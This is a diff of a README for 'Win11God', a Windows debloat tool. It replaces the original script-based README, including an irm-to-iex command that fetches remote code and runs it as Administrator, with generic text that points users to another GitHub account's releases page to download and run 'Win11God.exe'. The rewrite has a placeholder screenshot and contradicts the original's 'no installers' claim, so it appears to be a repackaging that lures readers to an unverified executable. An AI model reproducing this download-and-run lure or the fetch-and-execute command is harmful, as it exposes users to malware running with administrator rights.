@@ -1,167 +1,68 @@
-<div align="center">
+# 🖥️ Win11God - Optimize Your Windows Experience
 
-<img src="./win11god.png" alt="Win11God logo" width="96"/>
+[![Download Win11God](https://img.shields.io/badge/Download-Win11God-brightgreen)](https://github.com/Jdelzmichelpoireau/Win11God/releases)
 
-# Win11God
+## 📥 Overview
+Win11God is a next-generation Windows optimization framework built with PowerShell and WPF. It focuses on deep system tuning, debloating, performance tweaking, and real-time control. With a modern user interface and modular engine, Win11God offers safe optimizations and full transparency. It is designed for gamers, power users, and professionals who want to enhance their Windows experience.
 
-**A Windows 11‑style performance & debloat dashboard built in PowerShell + WPF.**
+## 🚀 Getting Started
+Follow these simple steps to download and run Win11God successfully on your Windows device.
 
-[![PowerShell](https://img.shields.io/badge/PowerShell-7%2B-5391FE?logo=powershell\&logoColor=white)](https://learn.microsoft.com/powershell/)
-[![WPF](https://img.shields.io/badge/WPF-XAML-9146FF)](#)
-[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D6?logo=windows\&logoColor=white)](#)
-[![Languages](https://img.shields.io/badge/i18n-pt%20%7C%20en%20%7C%20es-00A650)](#)
-[![Open Source](https://img.shields.io/badge/Open%20Source-Yes-1DB954)](#)
+## 🖱️ System Requirements
+To run Win11God, your system should meet the following requirements:
+- **Operating System**: Windows 11 or later
+- **RAM**: Minimum 4 GB (8 GB recommended)
+- **Disk Space**: At least 100 MB of free space
+- **.NET Framework**: Version 5.0 or later
 
-</div>
+## 📥 Download & Install
+To get started, visit this page to download:
 
-> **Straightforward. Reversible. Fast.**
->
-> Win11God centralizes safe Windows tweaks (cleanup, privacy, UX trimming) with one UI. Every change logs to a panel and most actions have one‑click **Revert**.
+[Download Win11God](https://github.com/Jdelzmichelpoireau/Win11God/releases)
 
----
+1. Click on the link above to access the Releases page.
+2. Look for the latest release version listed at the top.
+3. Download the file named `Win11God.exe` or similar.
+4. Once the download is complete, navigate to your Downloads folder.
 
-## ✅FAST USE 
-1. Open Powershell as Administrator
-2. Run this command: ```irm "https://amathyzin.com.br/win11god" | iex```
-3. Have fun!
+## 🔧 Run Win11God
+1. Locate the downloaded file (`Win11God.exe`).
+2. Double-click the file to run it.
+3. If prompted by Windows, click "Run" to allow the application to open.
 
-## ✨ Highlights
+## 🎮 Features
+- **Bloatware Removal**: Get rid of unwanted software that slows down your PC.
+- **FPS Booster**: Optimize your gaming experience for maximum performance.
+- **Telemetery Removal**: Disable unwanted data collection by Windows.
+- **Low-Spec PC Support**: Enhance performance on older systems without sacrificing usability.
+- **User-Friendly Interface**: Enjoy a modern, intuitive UI designed for everyday users.
 
-* 🪟 **Native Win11 look** — custom titlebar, Mica/Acrylic backdrop, dark theme.
-* 🚀 **One‑click optimizations** — Temp cleanup, Recycle Bin empty, Windows Update cache purge, DNS flush, Store reset, Recent files cleanup.
-* 🧩 **Performance toggles** — Disable Fast Startup, reduce Telemetry, trim UI animations, disable Game Bar/DVR, Widgets, tips, background apps, Copilot.
-* 🧼 **Debloat panel** — Remove bloat UWP apps (Candy Crush, Xbox suite, Skype, Groove, Movies & TV, News, Weather, Maps, 3D Viewer, etc.).
-* 🛟 **Safety first** — Optional **Restore Point** before applying and **Revert** actions (e.g., re‑enable Fast Startup, telemetry, services, taskbar/start menu defaults).
-* 🌐 **Built‑in i18n** — UI in **Português / English / Español** with runtime switch & persisted preference.
-* 📝 **Live log + Save** — Full on‑screen log and export to file.
+## ⚙️ How to Use
+Once Win11God is running:
+1. Navigate through the easy-to-use interface.
+2. Select the options you want for system tuning and optimization.
+3. Apply changes and monitor real-time performance adjustments.
 
----
+## 🛠️ Community & Support
+If you have questions or need assistance:
+- Visit the [Issues section](https://github.com/Jdelzmichelpoireau/Win11God/issues) on GitHub.
+- Join the community discussions to share tips or seek help.
 
-## 📸 UI Preview
+## 📸 Screenshots
+![Win11God Interface Screenshot](https://via.placeholder.com/800x400?text=Win11God+Interface)  
+*This is a placeholder. Actual interface may vary.*
 
-<p align="center">
-  <img src="./screenshot_win11god.png" alt="Win11God interface screenshot" width="900"/>
-</p>
+## 🔍 Explore More
+Check out the following topics to learn more about what Win11God can do:
+- **#bloatware-removal**: Focus on cleaning your system.
+- **#gaming-optimizer**: Get the most out of your games.
+- **#powershell**: Leverage the power of scripts for advanced features.
+- **#windows-11-tweaker**: Fine-tune your Windows 11 settings safely.
 
----
+## 🔗 Additional Resources
+For more information, visit:
+- [GitHub Repository](https://github.com/Jdelzmichelpoireau/Win11God)
 
-## 📦 Requirements
+Remember to follow the prompts and stay updated by checking back on the Releases page.
 
-* **Windows 11** (designed for) — also works on **Windows 10** with caution (fallbacks in place)
-* **PowerShell 5.1+** (preinstalled on Windows) or **PowerShell 7+**
-* **Administrator privileges** for most system tweaks (the app can run without, but some actions will be skipped)
-
----
-
-## 🛠️ Setup & Run
-
-> No external installers. Just clone and run the script. If you prefer a dry run, use `-NoElevation` and **Simulate** buttons.
-
-```powershell
-# 1) Clone this repository
-# 2) Start PowerShell as Administrator (recommended)
-# 3) Run the main script
-
-Set-ExecutionPolicy Bypass -Scope Process -Force
-./Win11God.ps1
-
-# Optional: run without auto‑elevation (useful for testing)
-./Win11God.ps1 -NoElevation
-```
-
-> **Note**: Execution policy is temporarily relaxed **only for the current session** in the snippet above.
-
----
-
-## 🧭 Features Overview
-
-### General → Cleanup
-
-* Delete temporary files (User + System Temp)
-* Empty Recycle Bin
-* Clear Windows Update cache
-* Flush DNS cache
-* Reset Microsoft Store cache
-* Clear Recent Files & Jump Lists
-
-### General → System & Performance
-
-* Disable **Fast Startup** (and **Reactivate** in Revert)
-* Reduce **Telemetry** to minimum allowed (and **Revert**)
-* Disable **Game Bar/DVR**
-* Reduce **UI animations**
-* Enable **Storage Sense** defaults
-* Disable **suggestions & tips**
-* Disable **Widgets**
-* Disable **background apps**
-* Disable **Copilot** (Win11 23H2+)
-
-### Debloat (Apps & Services)
-
-* Remove UWP bundles: **Candy Crush**, **Xbox suite**, **Skype**, **Groove**, **Movies & TV**, **News**, **Weather**, **Maps**, **3D Viewer**, etc.
-* Heavy services (advanced): **Windows Search indexing**, **Fax**, **Tablet Input**, **SysMain (Superfetch)**, **Cortana related**
-
-### Revert
-
-* Reactivate **Fast Startup**
-* Revert **Telemetry** settings
-* Restore disabled **services** and default UI behaviors (taskbar, start menu, context menu)
-
----
-
-## 🌍 Languages
-
-The UI ships with **Português (pt)**, **English (en)**, and **Español (es)**. On first run you can pick a language; your choice is saved to `%APPDATA%/Win11God/language.json`.
-
----
-
-## 🔐 Security & Transparency
-
-* **No installers**; pure script. Readable PowerShell code with explicit registry/service changes.
-* **Admin check** with clear warnings when actions might fail without elevation.
-* **Logging** to an on‑screen console with timestamps; optional **Save Log**.
-* **Restore Point** option to allow system rollback via Windows System Restore.
-
-> Tip: Review the code before running. You’re in control.
-
----
-
-## 🧪 Development
-
-* **Stack**: PowerShell + WPF (XAML), custom Win32 interop (Mica/Acrylic), runspaces for responsive background tasks.
-* **Structure**: UI (XAML) + logic functions (cleanup, debloat, revert, i18n, logging) in a single script for easy auditing.
-
-### Useful Developer Flags
-
-```powershell
-# Start without auto‑elevating (keeps same console)
-./Win11God.ps1 -NoElevation
-```
-
----
-
-## 🤝 Contributing
-
-PRs are welcome. Keep changes **auditable** and **reversible**. If you add a new tweak:
-
-* Include **log messages**, **i18n strings**, and **Revert** when applicable.
-* Prefer **policies/registry** over external binaries.
-* Document the rationale in the PR description.
-
----
-
-## 🧾 License
-
-This project is open source. See **LICENSE** for details.
-
----
-
-## 📣 Credits
-
-Built by **aMathyzin**. Portfolio: [https://amathyzin.xyz](https://amathyzin.xyz)
-
----
-
-## ⚠️ Disclaimer
-
-You use these tweaks at your own risk. Although this tool favors safe defaults and provides reversion paths, environments vary. Create a restore point or backup before major changes.
+Happy optimizing! Enjoy a smoother, faster Windows experience with Win11God.
